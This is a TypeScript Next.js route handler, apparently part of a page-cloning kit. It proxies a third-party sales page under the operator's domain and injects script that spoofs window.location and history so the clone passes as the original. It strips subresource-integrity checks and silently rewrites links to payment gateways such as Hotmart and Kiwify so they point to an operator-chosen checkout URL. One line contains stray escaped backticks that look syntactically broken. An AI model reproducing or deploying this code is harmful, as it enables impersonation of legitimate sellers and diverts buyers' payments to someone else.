import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import * as cheerio from 'cheerio';

/**
 * Page Proxy God Mode v7.4 — The "Invisible Path" Edition
 * 
 * Resolve o pisca-pisca fazendo a SPA acreditar que está na raiz.
 */

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;

    // 1. Buscar página (Fallback inteligente)
    let { data: page, error } = await supabaseAdmin.from('cloned_pages').select('*').eq('id', id).single();
    if (error || !page) {
      const { data: fallback } = await supabaseAdmin.from('cloned_pages').select('*').order('created_at', { ascending: false }).limit(1).single();
      page = fallback;
    }

    if (!page || !page.original_url) return new NextResponse('404', { status: 404 });

    const config = page.config || {};
    const originalUrl = page.original_url;
    const checkoutUrl = config.checkout_url || '';

    // 2. Fetch
    const response = await fetch(originalUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
    const buffer = await response.arrayBuffer();
    const rawHtml = new TextDecoder('utf-8').decode(buffer);
    const $ = cheerio.load(rawHtml);
    const baseUrl = new URL(originalUrl).origin;
    const targetHost = new URL(originalUrl).host;
    const currentOrigin = req.nextUrl.origin;
    const proxyPrefix = `/p/${id}`;

    // 3. Mascaramento de Caminho (O fim do pisca-pisca)
    $('head').prepend(`
      <script>
        (function() {
          const PREFIX = "${proxyPrefix}";
          const TARGET_ORIGIN = "${baseUrl}";
          
          // Fazer o site achar que está na raiz
          const spoof = (obj, prop, getVal) => {
            const desc = Object.getOwnPropertyDescriptor(obj, prop);
            Object.defineProperty(obj, prop, {
              get: getVal,
              set: (v) => { 
                if (typeof v === 'string' && v.startsWith('/') && !v.startsWith(PREFIX)) v = PREFIX + v;
                if (desc && desc.set) desc.set.call(obj, v); else obj[prop] = v;
              },
              configurable: true
            });
          };

          spoof(window.location, 'pathname', () => window.location.href.split(PREFIX)[1] || '/');
          spoof(window.location, 'href', () => TARGET_ORIGIN + (window.location.href.split(PREFIX)[1] || '/'));

          // Interceptar History para manter o prefixo escondido do site mas visível no browser
          const _push = history.pushState;
          const _repl = history.replaceState;
          history.pushState = function(s, t, u) {
            if (u && u.startsWith('/') && !u.startsWith(PREFIX)) u = PREFIX + u;
            return _push.apply(this, [s, t, u]);
          };
          history.replaceState = function(s, t, u) {
            if (u && u.startsWith('/') && !u.startsWith(PREFIX)) u = PREFIX + u;
            return _repl.apply(this, [s, t, u]);
          };
        })();
      </script>
    `);

    $('base').remove();
    $('head').prepend(`<base href="${originalUrl}">`);

    // 4. Reescrever Assets para não dar Tela Preta
    $('[src], [href]').each((_, el) => {
      const tag = $(el).prop('tagName');
      const attr = $(el).attr('src') ? 'src' : 'href';
      let val = $(el).attr(attr) || '';
      if (!val || val.startsWith('data:') || val.startsWith('javascript:') || val.startsWith('#')) return;

      if (tag === 'SCRIPT' || (tag === 'LINK' && $(el).attr('rel') === 'stylesheet')) {
        const abs = val.startsWith('/') ? baseUrl + val : (val.startsWith('http') ? val : baseUrl + '/' + val);
        $(el).attr(attr, \`\${currentOrigin}/api/proxy?url=\${encodeURIComponent(abs)}&overrideHost=\${targetHost}\`);
        $(el).removeAttr('integrity').removeAttr('crossorigin');
      }
    });

    // Checkout Logic
    const gateways = ['checkout', 'pay', 'comprar', 'hotmart', 'eduzz', 'monetizze', 'kiwify', 'braip', 'cakto', 'perfectpay', 'ticto', 'yampi', 'cartpanda', 'greenn', 'pepper', 'lowify', 'ironpay'];
    const checkoutScript = `
      <script>
        (function() {
          const CHECKOUT = '${checkoutUrl}';
          const gates = ${JSON.stringify(gateways)};
          function patch() {
            document.querySelectorAll('a').forEach(el => {
              const h = (el.getAttribute('href') || '').toLowerCase();
              if (CHECKOUT && (gates.some(g => h.includes(g)) || el.dataset.checkout)) {
                el.href = CHECKOUT;
                el.onclick = (e) => {
                  e.preventDefault();
                  const t = new URL(CHECKOUT);
                  new URLSearchParams(window.location.search).forEach((v, k) => t.searchParams.set(k, v));
                  window.top.location.href = t.toString();
                };
              }
            });
          }
          setInterval(patch, 1000);
        })();
      </script>
    `;
    $('body').append(checkoutScript);

    return new NextResponse($.html(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
  } catch (e) { return new NextResponse('Error', { status: 500 }); }
}
